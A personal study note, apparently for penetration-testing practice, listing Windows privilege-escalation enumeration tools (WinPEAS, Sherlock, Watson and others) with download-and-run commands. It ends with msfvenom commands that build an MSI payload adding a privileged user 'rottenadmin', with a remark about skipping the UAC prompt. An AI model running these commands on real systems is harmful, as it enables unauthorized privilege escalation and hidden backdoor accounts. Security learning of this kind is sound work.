---
id: Enumeration Tools
aliases:
  - WinPEAS
tags:
  - Microsoft/Windows/Privesc/Tools
links: Privesc
---

# Enumeration Tools

- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=winpeas#best-tool-to-look-for-windows-local-privilege-escalation-vectors----winpeas)

___

<!-- Enumeration Scripts {{{-->
## Enumeration Scripts

> [!warning]
>
> Running enumeration scripts can generate
> a significant amount of "noise",
> **potentially triggering anti-virus** or **security monitoring software**
>
> > [!tip]
> >
> > In some cases, it may be preferable
> > to conduct manual enumeration instead

<!-- WinPEAS-ng {{{-->
### WinPEAS-ng

[WinPEAS-ng](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) —
Privilege Escalation Awesome Scripts SUITE (*with colors*)

1. Download the script

```sh
wget https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1 -O winpeas.ps1
```

```sh
wget https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat -O winpeas.bat
```

2. Run as binary

```sh
.\winpeas.ps1
```

```sh
.\winpeas.bat
```

<!-- }}} -->

<!-- windows-privesc-check {{{-->
### windows-privesc-check

[windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check) —
Standalone Executable to Check for Simple Privilege Escalation Vectors
on Windows Systems (*by [Pentestmonkey](https://pentestmonkey.net/)*)

> [!warning]
>
> Last updated 11 years ago

<!-- }}} -->

<!-- Windows Exploit Suggester {{{-->
### Windows Exploit Suggester

[GitHub - Windows Exploit Suggester](https://github.com/strozfriedberg/Windows-Exploit-Suggester)

> [warning] DEPRECATED

<!-- }}} -->

<!-- JAWS {{{-->
### JAWS

[JAWS](https://github.com/411Hall/JAWS) —
Just Another Windows (*Enum*) Script

> [!warning] DEPRECATED

<!-- }}} -->

<!-- PowerSploit {{{-->
### PowerSploit

[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) —
PowerShell script to enumerate privilege escalation vectors

> [!warning] DEPRECATED

<!-- }}} -->

<!-- Sherlock {{{-->
### Sherlock

[Sherlock](https://github.com/rasta-mouse/Sherlock) —
PowerShell script to quickly find missing software patches
for local privilege escalation vulnerabilities

> [!warning] DEPRECATED

<!-- }}} -->

<!-- Watson {{{-->
### Watson

[GitHub - Watson](https://github.com/rasta-mouse/Watson)

> [!warning] DEPRECATED

<!-- }}} -->

___
<!-- }}} -->

<!-- Metasploit {{{-->
## Metasploit

> [!todo]

[[Metasploit]]

No UAC format

```sh
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
```

Using the `msiexec` the UAC wont be prompted

```sh
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
```

<!-- }}} -->
